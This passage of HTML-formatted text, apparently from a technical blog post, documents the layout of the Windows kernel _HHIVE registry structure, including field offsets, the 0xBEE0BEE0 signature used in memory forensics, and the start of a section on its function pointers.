 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x094&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;HvFreeCellsUse&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x098&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;HvUsedCellsUse&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x09c&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;CmUsedCellsUse&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0a0&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;HiveFlags&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0a4&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;CurrentLog&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0a8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;CurrentLogSequence&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0ac&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;CurrentLogMinimumSequence&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0b0&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;CurrentLogOffset&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0b4&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;MinimumLogSequence&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0b8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;LogFileSizeCap&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0bc&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;LogDataPresent&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;[2]&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;UChar&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0be&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;PrimaryFileValid&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;UChar&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0bf&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;BaseBlockDirty&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;UChar&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0c0&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;LastLogSwapTime&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_LARGE_INTEGER&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0c8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;FirstLogFile&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0c8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;SecondLogFile&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;3,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0c8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;HeaderRecovered&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;6,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0c8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;LegacyRecoveryIndicated&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;7,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0c8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;RecoveryInformationReserved&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;8,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0c8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;RecoveryInformation&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0ca&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;LogEntriesRecovered&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;[2]&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;UChar&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0cc&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;RefreshCount&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0d0&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;StorageTypeCount&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0d4&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0d8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ViewMap&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_HVP_VIEW_MAP&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x110&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Storage&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;[2]&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_DUAL&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.gw7njshogpzz&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;Signature&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;Equal to 0xBEE0BEE0, it is a unique signature of the _HHIVE / _CMHIVE structures. It may be useful in digital forensics for identifying these structures in raw memory dumps, and is yet another &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://devblogs.microsoft.com/oldnewthing/20030808-00/?p=42943&quot;&gt;reference to bees&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;in the Windows registry implementation.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.3opi7ajgt90r&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;Function pointers&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Next up, there are six function pointers, initialized in HvHiveStartFileBacked and HvHiveStartMemoryBacked, and pointing at internal kernel handlers for the following operations:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;tTszyzmaCA-c38&quot;&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c51 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c46 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Pointer name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
